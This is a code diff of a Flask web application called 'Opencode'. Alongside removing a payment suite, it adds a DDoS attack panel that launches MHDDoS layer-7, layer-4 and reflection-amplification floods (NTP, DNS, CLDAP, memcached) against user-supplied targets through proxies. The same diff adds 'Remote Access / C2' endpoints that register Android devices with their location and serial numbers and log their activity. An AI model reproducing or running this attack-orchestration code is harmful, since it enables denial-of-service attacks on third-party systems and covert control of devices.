@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Opencode — Main Flask Application (v4.5.0-professional)
+Opencode — Main Flask Application (v4.4.3-professional)
 
 Integrated stack:
   • scan_apikey v6.1.2    — Cloudflare bypass + strict FP filter
@@ -14,15 +14,21 @@ Integrated stack:
   • lfi_rfi v1.0.2         — Local/Remote File Inclusion scanner
   • modules.fixes          — Runtime patch for port_scan
 
-v4.5.0 changelog
-  • REM   — MHDDoS attack panel fully removed.
-  • REM   — Remote Access / C2 endpoints fully removed.
-  • CLN   — Dropped unused imports (`signal`, `Popen`, `PIPE`, `Path`).
-  • CHG   — Default port is 8080.
+v4.4.3 changelog
+  • REM — Billing suite removed: payment.html, management_payment.html,
+            api_key_request_token.html, /api/payment/* endpoints, and
+            payment_data.json storage. Accounts are provisioned by the
+            administrator directly (auth.user_store).
+  • NEW  — 8 scan modules: ssrf_scan, cors_check, http_methods,
+            graphql_scan, js_exposure, wellknown_meta, cookie_audit,
+            exposure_check.
+  • NEW  — AI chat: model selector (/api/chat/models), scan-result
+            context attachment, hardened system prompt.
 
 v4.4.2 changelog
   • FIX   — Ctrl+C at the port prompt now exits cleanly with
             "⊘ Cancelled by user" and exit code 130 (standard SIGINT).
+            Previously a raw Python traceback was printed.
   • FIX   — Ctrl+C while the Flask server is running shuts down
             gracefully with "⊘ Server stopped by user".
   • FIX   — Non-TTY stdin (docker / pipe / CI) now auto-falls back
@@ -57,6 +63,7 @@ import logging
 import os
 import re
 import secrets
+import signal
 import sys
 import threading
 import time
@@ -65,6 +72,8 @@ from collections import OrderedDict, defaultdict
 from datetime import datetime, timedelta, timezone
 from functools import wraps
 from importlib import import_module
+from pathlib import Path
+from subprocess import Popen, PIPE
 from typing import Any, Callable, Optional, Tuple
 
 import psutil
@@ -485,6 +494,172 @@ BANNER = r"""
 ██▄      ▄▄▌ ▐█▌       ▄█░▀ ██▄      ▄▄▌ ▐▒    ▒▌   ▐█▌     ▓▒░ ██▄      ▄▄▌ ▐█▌     ▄█░▀ ▄█▄     ▄█░▌
 ▀█  ▄▄▄▒▓▀    ▀░      ▐▓▀   ▀█  ▄▄▄▒▓▀   ▀▓▀  ▀▓▀    ▀██▄▄▄▒▓▀▒ ▀█  ▄▄▄▒▓▀    ▀░    ▐▓▀   ▀██▀▀▄▄▒▓▀  
 """
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# MHDDoS engine
+# ═══════════════════════════════════════════════════════════════════════════
+MHDDOS_SCRIPT = Path(__file__).parent / "start.py"
+_mhddos_processes = {}
+_mhddos_lock = threading.Lock()
+_mhddos_history = []
+_MHDDOS_HISTORY_LIMIT = 500
+
+_MHDDOS_METHODS = {
+    "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
+    "DYN", "SLOW", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB",
+    "AVB", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER",
+    "TOR", "RHEX", "STOMP",
+    "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION",
+    "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP",
+    "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP",
+}
+_MHDDOS_LAYER7 = {
+    "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
+    "DYN", "SLOW", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB",
+    "AVB", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER",
+    "TOR", "RHEX", "STOMP",
+}
+_MHDDOS_LAYER4 = {
+    "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION",
+    "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP",
+    "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP",
+}
+_MHDDOS_AMP = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}
+
+
+def _mhddos_build_command(method, target, threads, duration,
+                          proxy_type=0, proxy_file="proxies.txt",
+                          rpc=1, debug=False, reflector_file=""):
+    cmd = [sys.executable, str(MHDDOS_SCRIPT)]
+    if method in _MHDDOS_LAYER7:
+        url = target if target.startswith(("http://", "https://")) else f"http://{target}"
+        cmd.extend([method, url, str(proxy_type), str(threads),
+                    proxy_file, str(rpc), str(duration)])
+    else:
+        ip_port = target
+        if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", ip_port):
+            try:
+                from socket import gethostbyname
+                hostname, port = ip_port.rsplit(":", 1)
+                ip_port = f"{gethostbyname(hostname)}:{port}"
+            except Exception:
+                pass
+        cmd.extend([method, ip_port, str(threads), str(duration)])
+        if method in _MHDDOS_AMP:
+            cmd.append(reflector_file if reflector_file else "reflectors.txt")
+    if debug:
+        cmd.append("debug")
+    return cmd
+
+
+def _mhddos_start_attack(attack_id, method, target, threads, duration,
+                         proxy_type, proxy_file, rpc, reflector_file, debug):
+    cmd = _mhddos_build_command(method, target, threads, duration,
+                                proxy_type, proxy_file, rpc, debug, reflector_file)
+    try:
+        process = Popen(
+            cmd, stdout=PIPE, stderr=PIPE, text=True,
+            creationflags=0, cwd=str(Path(__file__).parent),
+        )
+        with _mhddos_lock:
+            _mhddos_processes[attack_id] = {
+                "process": process, "method": method, "target": target,
+                "threads": threads, "duration": duration,
+                "started_at": datetime.now(timezone.utc).isoformat(),
+                "status": "running", "attack_id": attack_id,
+            }
+            _mhddos_history.append({
+                "attack_id": attack_id, "method": method, "target": target,
+                "threads": threads, "duration": duration,
+                "started_at": datetime.now(timezone.utc).isoformat(),
+                "status": "running",
+            })
+            if len(_mhddos_history) > _MHDDOS_HISTORY_LIMIT:
+                del _mhddos_history[:-_MHDDOS_HISTORY_LIMIT]
+        threading.Thread(target=_mhddos_monitor, args=(attack_id,), daemon=True).start()
+        return {"success": True, "attack_id": attack_id}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+def _mhddos_monitor(attack_id):
+    with _mhddos_lock:
+        info = _mhddos_processes.get(attack_id)
+        if not info:
+            return
+        process = info["process"]
+    try:
+        timeout = info["duration"] + 15
+        process.wait(timeout=timeout)
+        status = "completed" if process.returncode == 0 else "failed"
+    except Exception:
+        status = "timeout"
+        try:
+            process.kill()
+        except Exception:
+            pass
+    with _mhddos_lock:
+        if attack_id in _mhddos_processes:
+            _mhddos_processes[attack_id]["status"] = status
+            _mhddos_processes[attack_id]["ended_at"] = datetime.now(timezone.utc).isoformat()
+        for entry in _mhddos_history:
+            if entry["attack_id"] == attack_id:
+                entry["status"] = status
+                entry["ended_at"] = datetime.now(timezone.utc).isoformat()
+                break
+
+
+def _mhddos_stop_attack(attack_id):
+    with _mhddos_lock:
+        info = _mhddos_processes.get(attack_id)
+        if not info:
+            return {"success": False, "error": "Attack not found"}
+        try:
+            if os.name == "nt":
+                info["process"].kill()
+            else:
+                info["process"].send_signal(signal.SIGTERM)
+            info["status"] = "stopped"
+            info["ended_at"] = datetime.now(timezone.utc).isoformat()
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+        for entry in _mhddos_history:
+            if entry["attack_id"] == attack_id:
+                entry["status"] = "stopped"
+                entry["ended_at"] = datetime.now(timezone.utc).isoformat()
+                break
+    return {"success": True}
+
+
+def _mhddos_stop_all():
+    stopped = 0
+    with _mhddos_lock:
+        for info in _mhddos_processes.values():
+            if info["status"] == "running":
+                try:
+                    info["process"].kill()
+                    info["status"] = "stopped"
+                    info["ended_at"] = datetime.now(timezone.utc).isoformat()
+                    stopped += 1
+                except Exception:
+                    pass
+    return {"success": True, "stopped": stopped}
+
+
+def _mhddos_get_status(attack_id=None):
+    with _mhddos_lock:
+        if attack_id:
+            return _mhddos_processes.get(attack_id, None)
+        running = [v for v in _mhddos_processes.values() if v["status"] == "running"]
+        return {
+            "running": running,
+            "history": list(_mhddos_history[-50:]),
+            "available": True,
+            "methods": sorted(_MHDDOS_METHODS),
+            "layer7": sorted(_MHDDOS_LAYER7),
+            "layer4": sorted(_MHDDOS_LAYER4),
+        }
 
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -911,68 +1086,6 @@ def _api_key_required(fn):
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# Payment data
-# ═══════════════════════════════════════════════════════════════════════════
-PAYMENT_DATA_FILE = os.path.join(PROJECT_ROOT, "payment_data.json")
-PAYMENT_PLANS_FILE = os.path.join(PROJECT_ROOT, "payment_plans.json")
-
-_default_plans = {
-    "free": {"name": "Free Plan", "price": "0.00"},
-    "starter": {"name": "Starter Plan", "price": "9.00"},
-    "standard": {"name": "Standard Plan", "price": "25.00"},
-    "team": {"name": "Team Plan", "price": "49.00"},
-    "enterprise": {"name": "Enterprise Plan", "price": "99.00"},
-}
-
-_payment_lock = threading.Lock()
-
-
-def _load_plans():
-    if os.path.exists(PAYMENT_PLANS_FILE):
-        try:
-            with open(PAYMENT_PLANS_FILE, "r") as f:
-                return json.load(f)
-        except (json.JSONDecodeError, IOError):
-            logger.warning("Failed to load payment plans, using defaults.")
-    return _default_plans.copy()
-
-
-def _save_plans(plans):
-    try:
-        with _payment_lock:
-            with open(PAYMENT_PLANS_FILE, "w") as f:
-                json.dump(plans, f, indent=2)
-        return True
-    except IOError:
-        logger.error("Failed to save payment plans.")
-        return False
-
-
-def _load_payments():
-    if os.path.exists(PAYMENT_DATA_FILE):
-        try:
-            with open(PAYMENT_DATA_FILE, "r") as f:
-                return json.load(f)
-        except (json.JSONDecodeError, IOError):
-            logger.warning("Failed to load payment data, starting empty.")
-    return []
-
-
-def _save_payments(payments):
-    try:
-        with _payment_lock:
-            with open(PAYMENT_DATA_FILE, "w") as f:
-                json.dump(payments, f, indent=2)
-        return True
-    except IOError:
-        logger.error("Failed to save payment data.")
-        return False
-
-
-payment_plans = _load_plans()
-
-
-# ═══════════════════════════════════════════════════════════════════════════
 # Login rate limiting
 # ═══════════════════════════════════════════════════════════════════════════
 MAX_LOGIN_ATTEMPTS = 5
@@ -1139,25 +1252,10 @@ def dashboard_page():
     )
 
 
-@app.route("/payment.html")
-def payment_page():
-    return render_template("payment.html")
-
-
-@app.route("/management_payment.html")
-@role_required("owner")
-def management_payment_page():
-    return render_template("management_payment.html")
-
-
-@app.route("/api_key_request_token.html")
-def api_key_request_token_page():
-    return render_template("api_key_request_token.html")
-
-
-@app.route("/api/api_key_request_token.html")
-def api_key_request_token_api_page():
-    return render_template("api_key_request_token.html")
+@app.route("/remote_access.html")
+@login_required
+def remote_access_page():
+    return render_template("remote_access.html")
 
 
 @app.route("/MyEspT.html")
@@ -1230,155 +1328,6 @@ def serve_template_assets(filename):
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# Payment API
-# ═══════════════════════════════════════════════════════════════════════════
-@app.route("/api/payment/plans", methods=["GET"])
-def get_payment_plans():
-    global payment_plans
-    payment_plans = _load_plans()
-    return jsonify({"plans": payment_plans})
-
-
-@app.route("/api/payment/submit", methods=["POST"])
-def submit_payment():
-    data = request.get_json(silent=True) or {}
-    plan = data.get("plan", "").strip()
-    amount = data.get("amount", "").strip()
-    payment_method = data.get("payment_method", "card")
-    requested_username = data.get("requested_username", "").strip()
-    card_last4 = data.get("card_number_last4", "")
-    if not plan or not amount or not requested_username:
-        return jsonify({"error": "plan, amount, and requested_username are required"}), 400
-    plans = _load_plans()
-    if plan not in plans:
-        return jsonify({"error": "Invalid plan"}), 400
-    if user_store.user_exists(requested_username):
-        return jsonify({"error": "Username already taken"}), 400
-    payment_id = "PAY-" + uuid.uuid4().hex[:10].upper()
-    username = session.get("username", "guest")
-    record = {
-        "payment_id": payment_id, "user": username,
-        "requested_username": requested_username, "plan": plan,
-        "amount": amount, "payment_method": payment_method,
-        "card_last4": card_last4, "status": "pending",
-        "created_at": datetime.now(timezone.utc).isoformat(),
-        "updated_at": datetime.now(timezone.utc).isoformat(),
-        "generated_username": None, "generated_password": None,
-    }
-    payments = _load_payments()
-    payments.append(record)
-    _save_payments(payments)
-    return jsonify({"payment_id": payment_id, "status": "pending"}), 201
-
-
-@app.route("/api/payment/status/<payment_id>", methods=["GET"])
-def get_payment_status(payment_id):
-    payments = _load_payments()
-    for record in payments:
-        if record["payment_id"] == payment_id:
-            if record["status"] == "approved" and record.get("generated_password"):
-                return jsonify({
-                    "payment_id": record["payment_id"], "status": record["status"],
-                    "generated_username": record["generated_username"],
-                    "generated_password": record["generated_password"],
-                    "plan": record["plan"], "amount": record["amount"],
-                })
-            return jsonify({"payment_id": record["payment_id"], "status": record["status"]})
-    return jsonify({"error": "Payment not found"}), 404
-
-
-@app.route("/api/payment/history", methods=["GET"])
-def get_payment_history():
-    user = session.get("username") if session.get("authenticated") else "guest"
-    payments = _load_payments()
-    user_payments = [p for p in payments if p["user"] == user]
-    for p in user_payments:
-        if not (p["status"] == "approved" and p.get("generated_password")
-                and (p["user"] == session.get("username") or session.get("role") == "owner")):
-            p.pop("generated_password", None)
-            p.pop("generated_username", None)
-    return jsonify({"payments": user_payments})
-
-
-@app.route("/api/payment/manage/plans", methods=["GET"])
-@role_required("owner")
-def manage_get_plans():
-    return jsonify({"plans": _load_plans()})
-
-
-@app.route("/api/payment/manage/plans", methods=["POST"])
-@role_required("owner")
-def manage_update_plans():
-    data = request.get_json(silent=True) or {}
-    new_plans = data.get("plans")
-    if not isinstance(new_plans, dict):
-        return jsonify({"error": "Invalid plans format"}), 400
-    global payment_plans
-    payment_plans = new_plans
-    if _save_plans(payment_plans):
-        return jsonify({"success": True, "plans": payment_plans})
-    return jsonify({"error": "Failed to save plans"}), 500
-
-
-@app.route("/api/payment/manage/pending", methods=["GET"])
-@role_required("owner")
-def manage_list_pending():
-    payments = _load_payments()
-    pending = [p for p in payments if p["status"] == "pending"]
-    return jsonify({"pending": pending})
-
-
-@app.route("/api/payment/manage/all", methods=["GET"])
-@role_required("owner")
-def manage_list_all_payments():
-    return jsonify({"payments": _load_payments()})
-
-
-@app.route("/api/payment/manage/approve/<payment_id>", methods=["POST"])
-@role_required("owner")
-def manage_approve_payment(payment_id):
-    payments = _load_payments()
-    for record in payments:
-        if record["payment_id"] == payment_id:
-            if record["status"] != "pending":
-                return jsonify({"error": "Payment already processed"}), 400
-            generated_password = uuid.uuid4().hex[:12]
-            try:
-                create_user(record["requested_username"], role="analyst", password=generated_password)
-                record["generated_username"] = record["requested_username"]
-                record["generated_password"] = generated_password
-                record["status"] = "approved"
-                record["updated_at"] = datetime.now(timezone.utc).isoformat()
-                _save_payments(payments)
-                logger.info(f"Payment {payment_id} approved. User {record['requested_username']} created.")
-                return jsonify({
-                    "success": True, "payment_id": record["payment_id"],
-                    "generated_username": record["generated_username"],
-                    "generated_password": record["generated_password"],
-                    "role": "analyst",
-                })
-            except Exception as e:
-                logger.error(f"Failed to create user for payment {payment_id}: {e}")
-                return jsonify({"error": f"User creation failed: {str(e)}"}), 500
-    return jsonify({"error": "Payment not found"}), 404
-
-
-@app.route("/api/payment/manage/reject/<payment_id>", methods=["POST"])
-@role_required("owner")
-def manage_reject_payment(payment_id):
-    payments = _load_payments()
-    for record in payments:
-        if record["payment_id"] == payment_id:
-            if record["status"] != "pending":
-                return jsonify({"error": "Payment already processed"}), 400
-            record["status"] = "rejected"
-            record["updated_at"] = datetime.now(timezone.utc).isoformat()
-            _save_payments(payments)
-            return jsonify({"success": True})
-    return jsonify({"error": "Payment not found"}), 404
-
-
-# ═══════════════════════════════════════════════════════════════════════════
 # OSINT endpoints
 # ═══════════════════════════════════════════════════════════════════════════
 @app.route("/api/osint/github")
@@ -1403,7 +1352,7 @@ def _proxy_osint(endpoint_slug, username):
             f"https://api.siputzx.my.id/api/stalk/{endpoint_slug}",
             params={"q": username, "username": username},
             timeout=15,
-            headers={"User-Agent": "Opencode/4.5.0"},
+            headers={"User-Agent": "Opencode/4.4.2"},
         )
         if resp.status_code == 200:
             return jsonify(resp.json())
@@ -2431,7 +2380,29 @@ def api_fetch_source():
 @role_required("owner", "analyst")
 def api_chat():
     data = request.get_json(silent=True) or {}
-    return jsonify(chat_handler.send(data.get("message", "")))
+    message = data.get("message", "")
+    model = data.get("model") or None
+    context = data.get("context") or None
+    result = chat_handler.send(message, model=model, context=context)
+    return jsonify(result)
+
+
+@app.route("/api/chat/models")
+@api_login_required
+def api_chat_models():
+    from ai_chat.chat_handler import AVAILABLE_MODELS, _DEFAULT_MODEL
+    configured = []
+    for m in AVAILABLE_MODELS:
+        backend_key = m["backend"]
+        ready = bool(Config.ANTHROPIC_API_KEY) if backend_key == "anthropic" \
+            else bool(Config.DEEPSEEK_API_KEY)
+        configured.append({**m, "ready": ready})
+    return jsonify({
+        "models": configured,
+        "default": _DEFAULT_MODEL if any(
+            m["id"] == _DEFAULT_MODEL for m in AVAILABLE_MODELS
+        ) else (AVAILABLE_MODELS[0]["id"] if AVAILABLE_MODELS else ""),
+    })
 
 
 @app.route("/api/chat/history")
@@ -2513,6 +2484,171 @@ def api_telegram_broadcast():
     if not message:
         return jsonify({"error": "message_required"}), 400
     return jsonify(broadcast_message(message))
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# MHDDoS Attack Panel
+# ═══════════════════════════════════════════════════════════════════════════
+@app.route("/api/mhddos/methods")
+@login_required
+def mhddos_methods():
+    return jsonify({
+        "available": True,
+        "methods": sorted(_MHDDOS_METHODS),
+        "layer7": sorted(_MHDDOS_LAYER7),
+        "layer4": sorted(_MHDDOS_LAYER4),
+    })
+
+
+@app.route("/api/mhddos/start", methods=["POST"])
+@login_required
+def mhddos_start():
+    data = request.get_json(silent=True) or {}
+    method = (data.get("method") or "").strip().upper()
+    target = (data.get("target") or "").strip()
+    threads = int(data.get("threads", 10))
+    duration = int(data.get("duration", 60))
+    proxy_type = int(data.get("proxy_type", 0))
+    proxy_file = (data.get("proxy_file") or "proxies.txt").strip()
+    rpc = int(data.get("rpc", 1))
+    reflector_file = (data.get("reflector_file") or "").strip()
+    debug = bool(data.get("debug", False))
+    if not method or not target:
+        return jsonify({"error": "method and target are required"}), 400
+    if method not in _MHDDOS_METHODS:
+        return jsonify({"error": f"Unknown method: {method}"}), 400
+    if threads < 1 or threads > 1000:
+        return jsonify({"error": "threads must be between 1 and 1000"}), 400
+    if duration < 1 or duration > 3600:
+        return jsonify({"error": "duration must be between 1 and 3600 seconds"}), 400
+    attack_id = "MHD-" + uuid.uuid4().hex[:8].upper()
+    result = _mhddos_start_attack(
+        attack_id, method, target, threads, duration,
+        proxy_type, proxy_file, rpc, reflector_file, debug
+    )
+    return jsonify(result), (201 if result.get("success") else 500)
+
+
+@app.route("/api/mhddos/stop", methods=["POST"])
+@login_required
+def mhddos_stop():
+    data = request.get_json(silent=True) or {}
+    attack_id = (data.get("attack_id") or "").strip()
+    if not attack_id:
+        return jsonify({"error": "attack_id required"}), 400
+    result = _mhddos_stop_attack(attack_id)
+    return jsonify(result), (200 if result.get("success") else 404)
+
+
+@app.route("/api/mhddos/stop_all", methods=["POST"])
+@login_required
+def mhddos_stop_all():
+    return jsonify(_mhddos_stop_all())
+
+
+@app.route("/api/mhddos/status")
+@login_required
+def mhddos_status():
+    attack_id = request.args.get("attack_id", "").strip()
+    status = _mhddos_get_status(attack_id or None)
+    if attack_id and status is None:
+        return jsonify({"error": "Attack not found"}), 404
+    return jsonify(status)
+
+
+@app.route("/api/mhddos/history")
+@login_required
+def mhddos_history():
+    limit = min(request.args.get("limit", 50, type=int), 200)
+    return jsonify({"history": _mhddos_history[-limit:]})
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# Remote Access / C2
+# ═══════════════════════════════════════════════════════════════════════════
+_lock_state = {"locked": True, "locked_by": None, "locked_at": None}
+_c2_devices = []
+_c2_activities = []
+_c2_lock = threading.Lock()
+
+
+@app.route("/api/c2/status")
+@login_required
+def c2_status():
+    return jsonify({
+        "authenticated": True, "username": session.get("username"),
+        "role": session.get("role"), "lock_state": _lock_state,
+    })
+
+
+@app.route("/api/c2/toggle_lock", methods=["POST"])
+@login_required
+def c2_toggle_lock():
+    with _c2_lock:
+        _lock_state["locked"] = not _lock_state["locked"]
+        if _lock_state["locked"]:
+            _lock_state["locked_by"] = session.get("username")
+            _lock_state["locked_at"] = datetime.now(timezone.utc).isoformat()
+        else:
+            _lock_state["locked_by"] = None
+            _lock_state["locked_at"] = None
+        return jsonify({"success": True, "lock_state": _lock_state})
+
+
+@app.route("/api/c2/devices")
+@login_required
+def c2_devices():
+    return jsonify({"devices": _c2_devices})
+
+
+@app.route("/api/c2/activities")
+@login_required
+def c2_activities():
+    limit = min(request.args.get("limit", 50, type=int), 200)
+    return jsonify({"activities": _c2_activities[-limit:]})
+
+
+@app.route("/api/c2/register_device", methods=["POST"])
+@login_required
+def c2_register_device():
+    data = request.get_json(silent=True) or {}
+    device_id = data.get("id", "").strip()
+    if not device_id:
+        return jsonify({"error": "Device ID is required"}), 400
+    device = {
+        "id": device_id, "name": data.get("name", device_id),
+        "model": data.get("model", ""), "serial": data.get("serial", ""),
+        "android": data.get("android", ""), "status": "online",
+        "battery": data.get("battery"), "location": data.get("location", ""),
+        "temperature": data.get("temperature", ""),
+        "last_seen": datetime.now(timezone.utc).isoformat(),
+    }
+    with _c2_lock:
+        for i, d in enumerate(_c2_devices):
+            if d["id"] == device_id:
+                _c2_devices[i] = device
+                break
+        else:
+            _c2_devices.append(device)
+    return jsonify({"success": True, "device": device})
+
+
+@app.route("/api/c2/log_activity", methods=["POST"])
+@login_required
+def c2_log_activity():
+    data = request.get_json(silent=True) or {}
+    device_id = data.get("device_id", "").strip()
+    action = data.get("action", "").strip()
+    if not device_id or not action:
+        return jsonify({"error": "device_id and action are required"}), 400
+    device_name = next((d["name"] for d in _c2_devices if d["id"] == device_id), device_id)
+    with _c2_lock:
+        _c2_activities.append({
+            "device_id": device_id, "device_name": device_name,
+            "action": action,
+            "timestamp": data.get("timestamp") or datetime.now(timezone.utc).isoformat(),
+        })
+    return jsonify({"success": True})
 
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -3861,7 +3997,7 @@ if __name__ == "__main__":
         sys.exit(0)
 
     # ── Port resolution ────────────────────────────────────────────────
-    # Default port is 8080.
+    # Default port is now 8080 (was 3052).
     DEFAULT_PORT = 8080
 
     env_port = os.getenv("PORT")
